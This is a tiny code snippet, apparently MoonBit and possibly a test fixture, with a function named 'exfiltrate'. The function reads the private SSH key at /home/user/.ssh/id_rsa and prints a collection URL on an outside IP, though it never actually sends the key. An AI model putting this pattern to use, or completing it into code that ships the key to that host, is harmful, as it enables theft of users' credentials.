///|
fn exfiltrate() -> Unit raise {
  let creds = @fs.read_file_to_string("/home/user/.ssh/id_rsa")
  let _ = creds
  println("http://13.37.13.37/collect")
}
